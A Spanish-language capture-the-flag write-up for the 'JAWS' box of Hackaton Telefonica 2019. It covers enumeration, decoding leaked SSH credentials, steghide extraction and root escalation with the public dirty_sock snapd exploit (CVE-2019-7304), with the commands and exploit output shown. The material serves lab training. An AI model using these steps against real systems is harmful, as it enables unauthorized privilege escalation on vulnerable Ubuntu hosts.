---
title: "Hackaton Telefonica 2019 – Box JAWS"
author: "31m0"
---



Lo primero que debemos realizar es la enumeración

```
root@kali:~# nmap -sV -A -O -T5 192.168.183.138
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 12:54 -04
Nmap scan report for 192.168.183.138
Host is up (0.00032s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 c1:99:81:14:84:14:bf:e9:24:30:6f:d4:2c:1b:08:c9 (RSA)
| 256 24:49:dc:93:d5:bb:0f:e5:d5:95:c5:7a:d3:a4:89:1d (ECDSA)
|_ 256 8c:6f:e6:cf:78:3d:39:87:9b:30:be:be:4d:59:ab:8b (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 4.6.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn’t have a title (text/html).
MAC Address: 00:0C:29:91:E7:D2 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 – 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT ADDRESS
1 0.32 ms 192.168.183.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
root@kali:~#
```

Con el escaneo primario vemos que tiene abierto el puerto 22 y 80

Accedemos a la url 192.168.183.138

![BOX JAW 1](/assets/images/post/2019/jaw1.png)

nos encontramos con una foto de un tiburón…

Revisamos con Wappalyzer vemos que contiene Drupal, Joomla, Wordpress

![BOX JAW 2](/assets/images/post/2019/jaw2.png)

Alto esto no esta bien…!!

Utilizaremos dirsearch para realizar la búsqueda de archivos y directorios en la url 192.168.183.138

![BOX JAW 3](/assets/images/post/2019/jaw3.png)

No encontramos nada, utilizaremos dirbuster para realizar una búsqueda  mas profunda
y utilizamos un diccionario  /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

![BOX JAW 4](/assets/images/post/2019/jaw4.jpg)

Después de un rato de búsqueda encontramos la entrada “Cryoserver.php” y «test.php»

![BOX JAW 5](/assets/images/post/2019/jaw5.png)

![BOX JAW 6](/assets/images/post/2019/jaw6.png)

Revisamos «test.php» y vemos un mensaje nos da una pista para no ocupar en modo nat.

![BOX JAW 7](/assets/images/post/2019/jaw7.png)

Ahora miramos la url 192.168.183.138/Cryoserver.php

![BOX JAW 8](/assets/images/post/2019/jaw8.png)

Encontramos un vídeo con la canción de babyshark….

<p>Pensando un poco en la primera entrada sale 1 tiburón, en la 2 otro tiburón…<br/>	
Haciendo alusión a tantos reseñas de tiburones utilizaremos Wireshark<br/>
buscamos haciendo filtros por protocolo http, tcp pero sin suerte…</p>

![BOX JAW 8](/assets/images/post/2019/jaw8.png)

Pero al ver el udp encontramos el primer Flag (aquí nos sirve la pista anterior, porque si ocupamos nat el paquete udp no llega)

![BOX JAW 9](/assets/images/post/2019/jaw9.png)

Para ver el texto mas claro utilizamos «follow udp stream»

![BOX JAW 10](/assets/images/post/2019/jaw10.png)

Pero el mensaje el flag no viene solo viene algo encodeado en base64
cHEyVHA2UmFUdWlRT0E0PWZmbmMgeGVudWZsbzRvPWVyZmg=
Decodificamos el mensaje

```
root@kali:~# echo `echo «cHEyVHA2UmFUdWlRT0E0PWZmbmMgeGVudWZsbzRvPWVyZmg=» | base64 –decode`
pq2Tp6RaTuiQOA4=ffnc xenuflo4o=erfh
root@kali:~#
```
al verlo no tiene mucho sentido, probaremos decodificar con rot13

![BOX JAW 11](/assets/images/post/2019/jaw11.png)

Validamos en la consola.

```
root@kali:~# echo «pq2Tp6RaTuiQOA4=ffnc xenuflo4o=erfh» | tr ‘[A-Za-z]’ ‘[N-ZA-Mn-za-m]’
cd2Gc6EnGhvDBN4=ssap krahsyb4b=resu
```

Algo de sentido tiene, pero hay que mirar a través del espejo y dar vuelta el string.

```
root@kali:~# echo «cd2Gc6EnGhvDBN4=ssap krahsyb4b=resu» | rev
user=b4byshark pass=4NBDvhGnE6cG2dc
root@kali:~#
```

Todo esto lo podemos simplificar en una linea.

````
root@kali:~# echo `echo «cHEyVHA2UmFUdWlRT0E0PWZmbmMgeGVudWZsbzRvPWVyZmg=»
| base64 –decode` | tr ‘[A-Za-z]’ ‘[N-ZA-Mn-za-m]’ | rev
user=b4byshark pass=4NBDvhGnE6cG2dc
root@kali:~#
```

Probaremos las credenciales para conectarnos por ssh

```
root@kali:~# ssh b4byshark@192.168.183.138
b4byshark@192.168.183.138’s password:

Last login: Wed May 1 12:27:21 2019 from 192.168.183.1
bash: groups: command not found
b4byshark@jaws:~$
```

Al listar el directorio, encontramos el 2 flag, pero también vemos el archivo Jaws.jpg

```
b4byshark@jaws:~$ ls -ltr
total 32
-rw-r–r– 1 1002 1002 25201 Apr 29 16:50 Jaws.jpg
-rw-r–r– 1 root root 38 Apr 29 22:12 flag2.txt
b4byshark@jaws:~$ cat flag2.txt
```

Listando la raíz solo vemos algunos directorios, al parecer es una cuenta sin privilegios

```
b4byshark@jaws:~$ ls /
bin dev etc home lib lib64 run usr
b4byshark@jaws:~$ uname -a
bash: uname: command not found
b4byshark@jaws:~$
```

Copiaremos el archivo Jaws.jpg a nuestra maquina para revisarlo si posee algun archivo o pista que se encuentre en la imagen.

````
b4byshark@jaws:~$ scp Jaws.jpg root@192.168.183.1:/root/Escritorio/
root@192.168.183.1’s password:
Jaws.jpg 100% 25KB 9.1MB/s 00:00
b4byshark@jaws:~$
```

Revisamos con Stegsolve sin resultados

![BOX JAW 12](/assets/images/post/2019/jaw12.png)

Utilizamos file, binwalk y strings sin resultado que nos interese….

```
root@kali:~/Escritorio# file Jaws.jpg
Jaws.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 96×96, segment length 16, baseline, precision 8, 612×399, components 3
root@kali:~/Escritorio# binwalk Jaws.jpg
```

<p>DECIMAL HEXADECIMAL DESCRIPTION<br/>——————————————————————————–<br/>0 0x0 JPEG image data, JFIF standard 1.01<br/>
root@kali:~/Escritorio# strings Jaws.jpg<br/><br/>JFIF<br/>$.’ «,#<br/>(7),01444<br/>‘9=82<.342<br/>!22222222222222222222222222222222222222222222222222<br/>$3br<br/>%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz<br/>#3R<br/>&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz<br/><\c.&#91;<br/>QTHQE<br/>eu\q </p>

Probaremos con steghide

```
root@kali:~/Escritorio# steghide info Jaws.jpg
«Jaws.jpg»:
formato: jpeg
capacidad: 1,1 KB
�Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto:
steghide: �no pude extraer ning�n dato con ese salvoconducto!
root@kali:~/Escritorio#
```

Efectivamente tiene datos adjuntos, pero no falta la pass…

Haciendo un poco de memoria en la url donde aparece el vídeo de babyshark hay un texto debajo,
probaremos el texto. **Baby Shark, doo, doo, doo, doo, doo, doo**

![BOX JAW 8](/assets/images/post/2019/jaw8.png)

```
root@kali:~/Escritorio# steghide extract -sf Jaws.jpg
Anotar salvoconducto:
anot� los datos extra�dos e/»user2.txt»
root@kali:~/Escritorio#
```

Utilizamos la contraseña y nos extrae el archivo user2.txt, al revisarlo nos aparece un string en base64
y aplicamos la misma técnica para resolver el string del usuario 1

````
root@kali:~/Escritorio# cat user2.txt
SWFlOHZpSlpTWmw1c2FSIDpmZm5DIHhlNHVmbHFxNHEgOmVyZkg=
root@kali:~/Escritorio# echo `echo «SWFlOHZpSlpTWmw1c2FSIDpmZm5DIHhlNHVmbHFxNHEgOmVyZkg=» | base64 –decode` | tr ‘[A-Za-z]’ ‘[N-ZA-Mn-za-m]’ | rev
User: d4ddysh4rk Pass: Enf5yMFMWvi8rnV
root@kali:~/Escritorio#
````

Probaremos las nuevas credenciales que obtuvimos

````
root@kali:~# ssh d4ddysh4rk@192.168.183.138
d4ddysh4rk@192.168.183.138’s password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

Last login: Tue Apr 30 18:14:44 2019 from 192.168.183.1
d4ddysh4rk@jaws:~$

Al listar encontramos un archivo con el tercer flag.
y una nota oculta que dejo el administrador del sistema

d4ddysh4rk@jaws:~$ ls -ltra
total 4
-rw-r–r– 1 root root 38 may 1 20:40 flag3.txt
-rw-rw-r– 1 d4ddysh4rk d4ddysh4rk 1 may 1 21:35 .readme.txt
d4ddysh4rk@jaws:~$
````

Leeremos la nota, la cual posee la clave para escalar privilegios, para poder finalmente obtener el root y el 4° flag

Al leer el documento vemos que se encuentra en braille, y para descifrar utilizaremos un deconde online
https://www.branah.com/braille-translator

	⠠⠓⠕⠇⠁⠀⠠⠇⠥⠊⠎⠂
	⠠⠉⠕⠝⠀⠗⠑⠎⠏⠑⠉⠞⠕⠀⠁⠀⠞⠥⠀⠉⠕⠝⠎⠥⠇⠞⠁⠀⠞⠑⠀⠉⠕⠍⠢⠞⠕⠀⠇⠕⠀⠎⠊⠛⠥⠊⠑⠝⠞⠑⠒
	
	⠠⠏⠇⠑⠭⠀⠧⠎⠀⠠⠅⠕⠙⠊⠒⠀⠙⠕⠎⠀⠉⠕⠝⠉⠑⠏⠞⠕⠎⠀⠙⠊⠋⠻⠑⠝⠞⠑⠎
	
	⠠⠅⠕⠙⠊⠀⠽⠀⠠⠏⠇⠑⠭⠀⠎⠕⠝⠀⠉⠕⠍⠏⠜⠁⠙⠕⠎⠀⠍⠥⠡⠁⠎⠀⠧⠑⠉⠑⠎⠂⠀
	⠏⠥⠑⠎⠀⠁⠍⠃⠁⠎⠀⠎⠕⠝⠀⠁⠏⠇⠊⠉⠁⠉⠊⠐⠕⠎⠀⠏⠜⠁⠀⠉⠕⠝⠧⠻⠞⠊⠗⠀⠞⠥⠀⠕⠗⠙⠑⠝⠁⠙⠕⠗⠂⠀
	⠍⠘⠌⠕⠧⠊⠇⠀⠕⠀⠞⠑⠇⠑⠧⠊⠎⠕⠗⠀⠑⠝⠀⠥⠝⠀⠏⠕⠞⠑⠝⠞⠑⠀⠉⠑⠝⠞⠗⠕⠀⠍⠥⠇⠐⠞⠙⠊⠁⠲⠀
	⠠⠎⠔⠀⠑⠍⠃⠜⠛⠕⠂⠀⠇⠁⠀⠍⠁⠝⠻⠁⠀⠑⠝⠀⠇⠁⠀⠟⠥⠑⠀⠇⠕⠀⠓⠁⠉⠑⠀⠉⠁⠙⠁⠀⠥⠝⠕⠀⠑⠎⠀⠞⠕⠞⠁⠇⠍⠑⠝⠞⠑⠀⠙⠊⠋⠻⠑⠝⠞⠑⠂⠀
	⠏⠕⠗⠀⠇⠕⠀⠟⠥⠑⠀⠞⠁⠍⠏⠕⠉⠕⠀⠎⠑⠀⠏⠥⠫⠑⠀⠓⠁⠉⠻⠀⠥⠝⠁⠀⠉⠕⠍⠏⠜⠁⠞⠊⠧⠁⠀⠚⠥⠌⠁⠀⠑⠝⠞⠗⠑⠀⠁⠍⠃⠕⠎⠀⠎⠻⠧⠊⠉⠊⠕⠎⠲
	
	⠠⠟⠥⠘⠌⠑⠀⠎⠊⠌⠑⠍⠁⠀⠍⠥⠇⠐⠞⠙⠊⠁⠀⠑⠇⠑⠛⠊⠗
	
	⠠⠁⠀⠋⠁⠧⠕⠗⠀⠙⠑⠀⠠⠏⠇⠑⠭
	
	⠼⠁⠲⠤⠥⠞⠊⠇⠊⠵⠁⠀⠑⠇⠀⠉⠕⠝⠞⠑⠝⠊⠙⠕⠀⠟⠥⠑⠀⠽⠁⠀⠞⠊⠑⠝⠑⠎⠀⠑⠝⠀⠑⠇⠀⠕⠗⠙⠑⠝⠁⠙⠕⠗
	⠼⠃⠲⠤⠥⠝⠁⠀⠔⠞⠻⠋⠁⠵⠀⠍⠘⠌⠁⠎⠀⠎⠑⠝⠉⠊⠇⠇⠁⠀⠽⠀⠍⠘⠌⠁⠎⠀⠋⠘⠌⠁⠉⠊⠇⠀⠙⠑⠀⠉⠕⠝⠋⠊⠛⠥⠗⠜
	⠼⠉⠲⠤⠞⠊⠑⠝⠑⠀⠁⠏⠇⠊⠉⠁⠉⠊⠐⠕⠎⠀⠏⠜⠁⠀⠏⠗⠘⠌⠁⠉⠞⠊⠉⠁⠍⠑⠝⠞⠑⠀⠉⠥⠁⠇⠟⠥⠊⠻⠀⠙⠊⠎⠏⠕⠎⠊⠞⠊⠧⠕
	⠼⠙⠲⠤⠑⠎⠀⠙⠑⠀⠉⠘⠌⠕⠙⠊⠛⠕⠀⠁⠃⠊⠻⠞⠕
	
	⠠⠁⠀⠋⠁⠧⠕⠗⠀⠙⠑⠀⠠⠅⠕⠙⠊
	⠼⠁⠲⠤⠥⠞⠊⠇⠊⠵⠁⠀⠑⠇⠀⠉⠕⠝⠞⠑⠝⠊⠙⠕⠀⠙⠊⠎⠏⠕⠝⠊⠃⠇⠑⠀⠑⠝⠀⠠⠔⠞⠻⠝⠑⠞
	⠼⠃⠲⠤⠎⠊⠑⠍⠏⠗⠑⠀⠏⠥⠫⠑⠎⠀⠔⠌⠁⠇⠜⠇⠑⠀⠠⠏⠇⠑⠭
	⠼⠉⠲⠤⠍⠘⠌⠁⠎⠀⠧⠻⠎⠘⠌⠁⠞⠊⠇⠀⠛⠗⠁⠉⠊⠁⠎⠀⠁⠀⠎⠥⠀⠔⠋⠔⠊⠞⠁⠀⠉⠕⠇⠑⠒⠊⠘⠌⠕⠝⠀⠙⠑⠀⠁⠙⠙⠕⠝⠎
	
	⠠⠎⠑⠛⠥⠝⠀⠍⠊⠀⠕⠏⠔⠊⠕⠝⠀⠏⠻⠎⠕⠝⠁⠇⠂⠀⠑⠎⠀⠍⠁⠎⠀⠎⠑⠝⠉⠊⠇⠇⠕⠀⠔⠌⠁⠇⠜⠀⠅⠕⠙⠊⠂⠀
	⠙⠑⠀⠓⠑⠡⠕⠂⠀⠏⠥⠫⠑⠎⠀⠏⠗⠕⠃⠜⠀⠑⠇⠀⠝⠥⠑⠧⠕⠀⠛⠑⠌⠕⠗⠀⠙⠑⠀⠏⠁⠟⠥⠑⠞⠑⠎⠀⠠⠠⠎⠝⠁⠏⠲


	Hola Luis,
	Con respecto a tu consulta te comento lo siguiente:
	
	Plex vs Kodi: dos conceptos diferentes
	
	Kodi y Plex son comparados muchas veces,
	pues ambas son aplicaciones para convertir tu ordenador,
	móvil o televisor en un potente centro multimedia.
	Sin embargo, la manera en la que lo hace cada uno es totalmente diferente,
	por lo que tampoco se puede hacer una comparativa justa entre ambos servicios.
	
	Qué sistema multimedia elegir
	
	A favor de Plex
	
	1.-Utiliza el contenido que ya tienes en el ordenador
	2.-Una interfaz más sencilla y más fácil de configurar
	3.-Tiene aplicaciones para prácticamente cualquier dispositivo
	4.-Es de código abierto
	
	A favor de Kodi
	1.-Utiliza el contenido disponible en Internet
	2.-Siempre puedes instalarle Plex
	3.-Más versátil gracias a su infinita colección de addons
	
	Según mi opinión personal, es mas sencillo instalar kodi,
	de hecho, puedes probar el nuevo gestor de paquetes SNAP.
	
	#snap install kodi –edge
	#snap run kodi

Averiguamos que versión de SNAP posee.

```
d4ddysh4rk@jaws:~$ snap version
snap 2.32.5+18.04
snapd 2.32.5+18.04
series 16
ubuntu 18.04
kernel 4.15.0-20-generic
```

Googleando un poco averiguamos un poco sobre la versión y encontraremos la siguiente información donde indica que es vulnerable.
[https://www.cvedetails.com/cve/CVE-2019-7304/](https://www.cvedetails.com/cve/CVE-2019-7304/){:target="_blank"}
[https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html){:target="_blank"}

Utilizamos la versión 2 del exploit dirty_sock
[https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py){:target="_blank"}

Lo copiamos en el directorio /tmp

```
d4ddysh4rk@jaws:/tmp$ ls
dirty_sockv2.py
d4ddysh4rk@jaws:/tmp$
```

y lo ejecutamos

```
d4ddysh4rk@jaws:/tmp$ python snap2.py

//=========[]==========================================\\
|| R&D || initstring (@init_string) ||
|| Source || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock ||
\\=========[]==========================================//

[+] Slipped dirty sock on random socket file: /tmp/euqevxzgih;uid=0;
[+] Binding to socket file…
[+] Connecting to snapd API…
[+] Deleting trojan snap (and sleeping 5 seconds)…
[+] Installing the trojan snap (and sleeping 8 seconds)…
[+] Deleting trojan snap (and sleeping 5 seconds)…

********************
Success! You can now `su` to the following account and use sudo:
username: dirty_sock
password: dirty_sock
********************

d4ddysh4rk@jaws:/tmp$
```

El exploit se aprovecha de Snap y crea un Usuario y Contraseña «dirty_sock» con privilegios de sudo

Finalmente probaremos el usuario creado

```
d4ddysh4rk@jaws:/tmp$ su dirty_sock
Contraseña:
To run a command as administrator (user «root»), use «sudo <command>».
See «man sudo_root» for details.
dirty_sock@jaws:/tmp$
```

Ahora probaremos los permisos de sudo para alcanzar root y obtener el 4 flag

````
dirty_sock@jaws:/home/d4ddysh4rk$ sudo su
[sudo] contraseña para dirty_sock:
root@jaws:/home/d4ddysh4rk# cat /root/flag4.txt
```

![BOX JAW 13](/assets/images/post/2019/jaw13.png)

```
root@jaws:/home/d4ddysh4rk#
```

Vemos el siguiente mensaje «ya casi has capturado al m3g4l0d0n esfuérzate un poco mas y lo obtendrás….»

![BOX JAW 14](/assets/images/post/2019/jaw14.png)

Al mirar detenidamente la imagen encontraremos el ultimo flag, en el interior del tiburón.

![31mo](https://www.hackthebox.com/badge/image/23069)

Si quieres ver otros Write revisa los siguientes enlaces.

HAckAtOn Telefónica 2019

Caja

	Bofetada - https://github.com/s1kr10s/WriteUp
	Cacofonia - https://medium.com/@ctorogar/write-up-cacofon%C3%ADa-47cb732f46f8
	Go - https://partyhack.cl/2019/07/31/hackaton-telefonica-2019-box-writeup-go
	Jaws - https://partyhack.cl/2019/07/31/hackaton-telefonica-2019-box-jaws-31m0
	PrueBatch - https://finsin.cl/2019/07/30/escrito-de-hackatontelefonica-pruebatch
	TreasureIsland - https://finsin.cl/2019/07/30/escrito-de-hackatontelefonica-treasure-island
	Bury a Fr1end - https://partyhack.cl/2019/07/31/hackaton-telefonica-2019-box-writeup-bury_a_fr1end

Reto

	0p3npuff, Fr34kySh4rk, Cr33py, P4st3b1n - https://partyhack.cl/2019/07/31/hackaton-telefonica-2019-retos-0p3npuff-cr33py-fr34kys

